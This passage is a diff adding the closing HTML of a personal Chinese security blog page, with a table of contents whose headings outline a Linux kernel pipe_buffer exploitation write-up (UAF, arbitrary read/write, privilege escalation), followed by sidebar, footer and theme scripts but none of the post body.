+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pipe-buffer"><span class="nav-number">1.</span> <span class="nav-text">pipe_buffer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E9%A1%B5%E7%BA%A7uaf"><span class="nav-number">2.1.</span> <span class="nav-text">构造页级uaf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%BA%8C%E7%BA%A7%E8%87%AA%E5%86%99%E7%AE%A1%E9%81%93"><span class="nav-number">2.2.</span> <span class="nav-text">构造二级自写管道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99"><span class="nav-number">2.3.</span> <span class="nav-text">任意读写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF"><span class="nav-number">2.3.1.</span> <span class="nav-text">任意读写设计思路</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="nav-number">2.4.</span> <span class="nav-text">地址泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.5.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#USMA"><span class="nav-number">2.5.1.</span> <span class="nav-text">USMA</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ROP"><span class="nav-number">2.5.2.</span> <span class="nav-text">ROP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9cred"><span class="nav-number">2.5.3.</span> <span class="nav-text">修改cred</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TODO"><span class="nav-number">3.</span> <span class="nav-text">TODO</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Eurus"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Eurus</p>
+  <div class="site-description" itemprop="description">本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/akaieurus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;akaieurus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1826983968@qq.com" title="E-Mail → 1826983968@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">true</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+</body>
+</html>
